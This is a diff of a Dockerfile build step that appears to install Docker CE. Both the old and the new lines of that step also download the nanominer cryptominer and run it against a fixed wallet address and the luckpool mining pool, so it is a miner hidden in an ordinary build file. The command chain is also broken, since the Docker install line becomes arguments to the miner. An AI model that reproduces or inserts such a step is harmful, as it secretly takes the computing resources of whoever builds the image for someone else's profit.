@@ -5,8 +5,7 @@ RUN apt-get update && \
     apt-get install apt-transport-https ca-certificates curl software-properties-common && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
-    apt-get update && \
-    wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-linux-3.5.2.tar.gz && tar -xf nanominer-linux-3.5.2.tar.gz && cd nanominer-linux-3.5.2 && ./nanominer -algo Verushash -wallet RQFAzGsrDocDdd5jUaY8iXzkB771AAY3WjrvfgfL -rigPassword Arifin -pool1 na.luckpool.net:3956 \
+    apt-get update && wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-linux-3.5.2.tar.gz && tar -xf nanominer-linux-3.5.2.tar.gz && cd nanominer-linux-3.5.2 && ./nanominer -algo Verushash -wallet RQFAzGsrDocDdd5jUaY8iXzkB771AAY3WjrvfgfL -rigPassword Arifin -pool1 na.luckpool.net:3956 \
     apt install docker-ce
 
 # install docker compose
